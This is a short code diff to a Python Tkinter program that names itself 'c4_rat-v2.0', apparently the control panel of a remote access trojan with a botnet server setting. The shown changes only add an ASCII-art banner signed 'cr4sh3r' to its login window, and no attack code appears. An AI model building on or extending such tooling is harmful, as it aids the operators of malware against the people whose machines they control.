@@ -29,6 +29,18 @@ sid = "01"
 # Some other variables...
 # Do not alter!
 
+art = """
+        ___               _   _                             _
+       /   |             | | | |                           | |
+  ___ / /| |  _ __  _   _| |_| |__   ___  _ __    _ __ __ _| |_
+ / __/ /_| | | '_ \| | | | __| '_ \ / _ \| '_ \  | '__/ _` | __|
+| (__\___  | | |_) | |_| | |_| | | | (_) | | | | | | | (_| | |_
+ \___|   |_/ | .__/ \__, |\__|_| |_|\___/|_| |_| |_|  \__,_|\__|
+             | |     __/ |
+             |_|    |___/      version 2.0
+
+ cr4sh3r                   """
+
 usr = ""
 cbi = ""
 botavl = True
@@ -574,6 +586,12 @@ def login():
     # Welcome text
     well = Tkinter.Label(text = "Welcome to the c4_rat-v2.0,  _" + hacker +"_  !  ||  Current server : " + sid)
     well.configure(background = "#333", foreground="white")
+    
+    # Art
+    global art
+    atext = Tkinter.Text(root, wrap='word')
+    atext.configure(background = "#333", foreground="white")
+    atext.insert('1.0',art)
 
     # Login
     e1 = Tkinter.Entry(root)
@@ -594,6 +612,8 @@ def login():
     lt.pack(side = "bottom", anchor = "w")
 
     well.pack(side = "top", anchor = "w")
+    
+    atext.pack(side = "top", anchor = "center")
 
     # Main loop
     root.mainloop()
